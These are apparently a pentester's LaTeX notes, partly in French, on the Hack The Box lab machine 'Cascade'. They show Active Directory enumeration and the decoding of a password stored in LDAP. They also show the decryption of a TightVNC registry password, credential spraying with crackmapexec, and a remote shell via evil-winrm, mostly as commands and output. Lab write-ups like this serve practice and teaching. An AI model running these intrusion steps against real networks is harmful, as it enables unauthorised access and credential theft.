\chapter{Cascade}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -Pn -oX cascade.xml 10.10.10.182
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 16:05 CEST
Nmap scan report for dc1.cascade.local (10.10.10.182)
Host is up (0.047s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-13 14:05:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time:
|   date: 2022-10-13T14:06:48
|_  start_date: 2022-10-13T13:57:03
\end{verbatim}

\subsubsection{dns}

\begin{verbatim}
$ drill @10.10.10.182 any cascade.local
;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 55210
;; flags: qr aa rd ra ; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2
;; QUESTION SECTION:
;; cascade.local.       IN      ANY

;; ANSWER SECTION:
cascade.local.  600     IN      A       10.10.10.182
cascade.local.  600     IN      A       10.10.10.183
cascade.local.  3600    IN      NS      casc-dc1.cascade.local.
cascade.local.  3600    IN      SOA     casc-dc1.cascade.local. hostmaster.cascade.local. 117 900 600 86400 3600
cascade.local.  600     IN      AAAA    dead:beef::8a8:d14d:1d23:bbe2

;; AUTHORITY SECTION:

;; ADDITIONAL SECTION:
casc-dc1.cascade.local. 3600    IN      A       10.10.10.182
casc-dc1.cascade.local. 3600    IN      AAAA    dead:beef::eca6:5958:682b:a498

;; Query time: 25 msec
;; SERVER: 10.10.10.182
;; WHEN: Thu Oct 13 16:07:50 2022
;; MSG SIZE  rcvd: 205
$ dig @10.10.10.182 axfr cascade.local

; <<>> DiG 9.18.7 <<>> @10.10.10.182 axfr cascade.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
 ===================================================
|    Domain Information via RPC for 10.10.10.182    |
 ===================================================
[+] Domain: CASCADE
[+] Domain SID: S-1-5-21-3332504370-1206983947-1165150453
[+] Membership: domain member
 ===============================================
|    OS Information via RPC for 10.10.10.182    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null



 ======================================
|    Shares via RPC on 10.10.10.182    |
 ======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =====================================
|    Users via RPC on 10.10.10.182    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 15 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 15 user(s) via 'enumdomusers'
[+] After merging user results we have 15 user(s) total:
'1106':
  username: arksvc
  name: ArkSvc
  acb: '0x00000210'
  description: (null)
'1107':
  username: s.smith
  name: Steve Smith
  acb: '0x00000210'
  description: (null)
'1109':
  username: r.thompson
  name: Ryan Thompson
  acb: '0x00000210'
  description: (null)
'1111':
  username: util
  name: Util
  acb: '0x00000210'
  description: (null)
'1116':
  username: j.wakefield
  name: James Wakefield
  acb: '0x00000210'
  description: (null)
'1121':
  username: s.hickson
  name: Stephanie Hickson
  acb: '0x00000210'
  description: (null)
'1122':
  username: j.goodhand
  name: John Goodhand
  acb: '0x00000210'
  description: (null)
'1124':
  username: a.turnbull
  name: Adrian Turnbull
  acb: '0x00000214'
  description: (null)
'1127':
  username: e.crowe
  name: Edward Crowe
  acb: '0x00000211'
  description: (null)
'1128':
  username: b.hanson
  name: Ben Hanson
  acb: '0x00000211'
  description: (null)
'1129':
  username: d.burman
  name: David Burman
  acb: '0x00000210'
  description: (null)
'1130':
  username: BackupSvc
  name: BackupSvc
  acb: '0x00000210'
  description: (null)
'1134':
  username: j.allen
  name: Joseph Allen
  acb: '0x00000210'
  description: (null)
'1135':
  username: i.croft
  name: Ian Croft
  acb: '0x00000211'
  description: (null)
'501':
  username: CascGuest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain

 ======================================
|    Groups via RPC on 10.10.10.182    |
 ======================================
[*] Enumerating local groups
[+] Found 17 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 15 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 6 group(s) via 'enumdomgroups'
[+] After merging groups results we have 38 group(s) total:
'1102':
  groupname: DnsAdmins
  type: local
'1103':
  groupname: DnsUpdateProxy
  type: domain
'1113':
  groupname: IT
  type: local
'1114':
  groupname: Production
  type: local
'1115':
  groupname: HR
  type: local
'1119':
  groupname: AD Recycle Bin
  type: local
'1120':
  groupname: Backup
  type: local
'1123':
  groupname: Temps
  type: local
'1125':
  groupname: WinRMRemoteWMIUsers__
  type: local
'1126':
  groupname: Remote Management Users
  type: local
'1132':
  groupname: Factory
  type: local
'1133':
  groupname: Finance
  type: local
'1137':
  groupname: Audit Share
  type: local
'1138':
  groupname: Data Share
  type: local
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'520':
  groupname: Group Policy Creator Owners
  type: domain
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
\end{verbatim}

\subsubsection{kerberos}
try asp-roast
\begin{verbatim}
$ kerbrute  userenum  --dc 10.10.10.182 -d cascade.local users.asc

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 10/13/22 - Ronnie Flathers @ropnop

2022/10/13 16:25:39 >  Using KDC(s):
2022/10/13 16:25:39 >   10.10.10.182:88

2022/10/13 16:25:44 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       arksvc@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       r.thompson@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       util@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       s.smith@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2022/10/13 16:25:44 >  [+] VALID USERNAME:       s.hickson@cascade.local
2022/10/13 16:25:50 >  [+] VALID USERNAME:       d.burman@cascade.local
2022/10/13 16:25:50 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2022/10/13 16:25:50 >  [+] VALID USERNAME:       j.allen@cascade.local
2022/10/13 16:25:50 >  Done! Tested 15 usernames (11 valid) in 10.318 seconds
\end{verbatim}
11/15 ?

\begin{verbatim}
$ GetNPUsers.py cascade.local/ -usersfile users.asc -dc-ip 10.10.10.182
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] invalid principal syntax
[-] invalid principal syntax
\end{verbatim}

\subsubsection{ldap}
\begin{verbatim}
$ ldapsearch -H ldap://casc-dc1.cascade.local -x -b "DC=cascade,dc=local" \
    -s sub  "(objectclass=user)"

$ ldapsearch -H ldap://casc-dc1.cascade.local  -x -b \
    "DC=cascade,dc=local" -s sub  "(objectclass=user)" |
    grep : | cut -d ':' -f 1 |sort | uniq 


cascadeLegacyPwd
\end{verbatim}

\begin{verbatim}
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
\end{verbatim}

\begin{verbatim}
 echo 'clk0bjVldmE=' |base64 -d
rY4n5ev
\end{verbatim}

\begin{verbatim}
$ crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
\end{verbatim}


\subsubsection{SMB}

\begin{verbatim}
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Audit$
[+] Mapping: OK, Listing: DENIED
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Data
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
[-] Could not check share: STATUS_INVALID_PARAMETER
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share print$
[+] Mapping: OK, Listing: OK
\end{verbatim}


\begin{verbatim}
$ smbmap -H 10.10.10.182  -R -u 'r.thompson' -p 'rY4n5eva'
\end{verbatim}


\begin{verbatim}
<p>For anyone that missed yesterdays meeting (Im looking at
you Ben). Main points are below:</p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the Best GPO competition will be
announced on Friday so get your submissions in soon.</p>

\end{verbatim}


\begin{verbatim}
Event String:
            Time Provider NtpClient: This machine is configured to use the domain hierarchy to determine its time source, but it is the AD PDC emulator for the domain at the root of the forest, so there is no ma
chine above it in the domain hierarchy to use as a time source. It is recommended that you either configure a reliable time service in the root domain, or manually configure the AD PDC to synchronize with an ext
ernal time source. Otherwise, this machine will function as the authoritative time source in the domain hierarchy. If an external time source is not configured or used for this computer, you may choose to disabl
e the NtpClient.

 The WinRM service failed to create the following SPNs: WSMAN/CASC-DC1.cascade.local; WSMAN/CASC-DC1.
\end{verbatim}

\begin{verbatim}
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
\end{verbatim}


\begin{verbatim}
$ cat VNC\ Install.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
\end{verbatim}

Oula \verb+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f+ sur vnc

\url{https://www.hackingarticles.in/vnc-penetration-testing/}

\begin{verbatim}
git clone https://github.com/trinitronx/vncpasswd.py
cd vncpasswd.py
./vncpasswd.py -d -H 6bcf2a4b6e5aca0f
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
\end{verbatim}



\begin{verbatim}
sysvol/cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}$ cat MACHINE/Microsoft/Windows\ NT/SecEdit/GptTmpl.inf
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19,DefaultAppPool
SeAuditPrivilege = *S-1-5-20,*S-1-5-19,DefaultAppPool
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-568,*S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19,DefaultAppPool
SeInteractiveLogonRight = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-1-0,*S-1-5-9,*S-1-5-11,*S-1-5-32-544
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = WdiServiceHost,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Registry Values]
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel=4,5
\end{verbatim}

\subsubsection{Active Directory}

\begin{verbatim}
$ bloodhound-python  -u 'r.thompson' -p 'rY4n5eva' -c All -d cascade.local  -ns 10.10.10.182
INFO: Found AD domain: cascade.local
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: casc-dc1.cascade.local
INFO: Found 18 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CASC-DC1.cascade.local
INFO: Done in 00M 06S
\end{verbatim}

rien de probant.

\begin{verbatim}
\end{verbatim}

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
$ crackmapexec smb 10.10.10.182 -u ~/documents/pentesting-games/htb/users.asc -p sT333ve2
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2

$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
*Evil-WinRM* PS C:\Users\s.smith\Documents>
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


